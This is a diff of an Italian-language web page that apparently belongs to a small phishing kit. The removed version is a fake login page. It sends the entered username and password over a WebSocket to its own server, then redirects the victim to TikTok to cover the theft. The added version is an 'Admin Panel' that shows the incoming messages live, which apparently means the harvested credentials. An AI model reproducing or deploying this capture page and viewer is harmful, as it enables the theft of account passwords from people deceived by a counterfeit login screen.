@@ -2,74 +2,45 @@
 <html lang="it">
 <head>
   <meta charset="utf-8">
-  <title>Login</title>
-  <link rel="stylesheet" href="style.css">
+  <title>Admin Panel - Live</title>
   <style>
-    body {
-      font-family: Arial;
-      background: #f2f2f2;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    #box {
-      background: white;
-      padding: 25px;
-      border-radius: 12px;
-      width: 300px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.15);
-      text-align: center;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #007bff;
-      border: none;
-      color: white;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
+    body { font-family: sans-serif; background: #f0f2f5; padding: 20px; }
+    #feed { max-width: 600px; margin: auto; display: flex; flex-direction: column; }
+    .msg { background: white; padding: 15px; border-radius: 8px; margin-bottom: 10px; border-left: 5px solid #007bff; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+    .meta { font-size: 0.85em; color: #666; margin-bottom: 5px; }
+    .content { font-weight: bold; color: #333; word-break: break-all; }
   </style>
 </head>
 <body>
+  <h2 style="text-align:center;">Pannello Admin - Messaggi in Arrivo</h2>
+  <div id="feed"></div>
 
-<div id="box">
-  <h2>Login</h2>
+  <script>
+    const ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host);
 
-  <input id="user" placeholder="Username">
-  <input id="pass" placeholder="Password" type="password">
+    ws.onmessage = (event) => {
+      try {
+        const data = JSON.parse(event.data);
+        const feed = document.getElementById("feed");
+        
+        const div = document.createElement("div");
+        div.className = "msg";
+        
+        const meta = document.createElement("div");
+        meta.className = "meta";
+        meta.textContent = `${data.user} • ${new Date(data.ts).toLocaleTimeString()}`;
+        
+        const content = document.createElement("div");
+        content.className = "content";
+        content.textContent = data.message;
 
-  <button id="enter">ENTER</button>
-</div>
-
-<script>
-  const ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host);
-
-  document.getElementById("enter").onclick = () => {
-    const u = document.getElementById("user").value;
-    const p = document.getElementById("pass").value;
-
-    ws.send(JSON.stringify({
-      user: u,
-      message: p
-    }));
-
-    // Redirect a TikTok dopo l'invio
-    setTimeout(() => {
-      window.location.href = "https://www.tiktok.com";
-    }, 300);
-  };
-</script>
-
+        div.appendChild(meta);
+        div.appendChild(content);
+        feed.prepend(div);
+      } catch (e) {
+        console.error("Errore ricezione:", e);
+      }
+    };
+  </script>
 </body>
 </html>
